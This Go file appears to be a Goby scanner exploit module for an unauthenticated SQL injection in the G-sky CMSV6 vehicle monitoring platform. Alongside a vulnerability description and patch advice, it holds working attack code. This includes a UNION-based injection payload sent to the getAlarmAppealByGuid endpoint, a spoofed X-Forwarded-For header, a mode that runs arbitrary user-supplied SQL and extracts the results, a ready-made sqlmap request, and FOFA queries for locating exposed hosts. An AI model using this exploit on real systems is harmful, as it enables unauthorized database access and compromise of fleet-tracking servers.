package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "G-sky CMSV6 Vehicle Positioning Monitoring Platform /getAlarmAppealByGuid;downloadLogger.action SQL Injection Vulnerability",
    "Description": "<p>G-sky CMSV6 vehicle positioning monitoring platform has a R &amp; D team with location services, wireless 3G/4G video transmission and cloud storage services as the core, focusing on providing platform services for positioning and wireless video terminal products, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products video integrated platform. </p><p>The SQL injection vulnerability exists in the getAlarmAppealByGuid interface. Unauthorized attackers can obtain database permissions through this vulnerability, and further exploit it to cause the server to crash.</p>",
    "Product": "G-sky CMSV6 Vehicle Positioning Monitoring Platform",
    "Homepage": "http://www.g-sky.cn/list-20-1.html",
    "DisclosureDate": "2024-08-27",
    "PostTime": "2024-08-29",
    "Author": "hhh3156",
    "FofaQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "GobyQuery": "body=\"./open/webApi.html\" && body=\"/808gps/\"",
    "Level": "2",
    "Impact": "<p>The SQL injection vulnerability exists in the getAlarmAppealByGuid interface. Unauthorized attackers can obtain database permissions through this vulnerability, and further exploit it to cause the server to crash.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.g-sky.cn/list-20-1.html\">http://www.g-sky.cn/list-20-1.html</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "通天星CMSV6车载视频监控平台 /getAlarmAppealByGuid;downloadLogger.action SQL 注入漏洞",
            "Product": "通天星CMSV6车载视频监控平台",
            "Description": "<p>通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。<br></p><p>其 getAlarmAppealByGuid 接口处存在SQL注入漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.g-sky.cn/list-20-1.html\">http://www.g-sky.cn/list-20-1.html</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其 getAlarmAppealByGuid 接口处存在SQL注入漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "G-sky CMSV6 Vehicle Positioning Monitoring Platform /getAlarmAppealByGuid;downloadLogger.action SQL Injection Vulnerability",
            "Product": "G-sky CMSV6 Vehicle Positioning Monitoring Platform",
            "Description": "<p>G-sky CMSV6 vehicle positioning monitoring platform has a R &amp; D team with location services, wireless 3G/4G video transmission and cloud storage services as the core, focusing on providing platform services for positioning and wireless video terminal products, CMSV6 products covering vehicle video recorders, individual video recorders, network surveillance cameras, driving recorders and other products video integrated platform.&nbsp;</p><p>The SQL injection vulnerability exists in the getAlarmAppealByGuid interface. Unauthorized attackers can obtain database permissions through this vulnerability, and further exploit it to cause the server to crash.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.g-sky.cn/list-20-1.html\">http://www.g-sky.cn/list-20-1.html</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The SQL injection vulnerability exists in the getAlarmAppealByGuid interface. Unauthorized attackers can obtain database permissions through this vulnerability, and further exploit it to cause the server to crash.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9947"
}`

	setSqlPayloadHash_uhfTABOOufbua968O3Oo3o69bb6 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		urlget := `/alarm_appeal/getAlarmAppealByGuid;downloadLogger.action`
		data := `guid=1') UNION ALL SELECT NULL,(` + sql + `),NULL-- -`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Referer":         hostInfo.FixedHostInfo,
			"X-Forwarded-For": "127.0.0.1",
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		resp, err = setPostRequest(hostInfo, urlget, data, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = urlget

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			rand.Seed(time.Now().UnixNano())
			randomString := strconv.Itoa(rand.Intn(8999) + 1000)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// GetgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `md5(` + randomString + `)`

			sendPayload := setSqlPayloadHash_uhfTABOOufbua968O3Oo3o69bb6

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\nX-Forwarded-For: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\n\nguid=1') UNION ALL SELECT NULL,(database()),NULL-- -"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `,"guid":"([\s\S]*?)",`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_uhfTABOOufbua968O3Oo3o69bb6
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
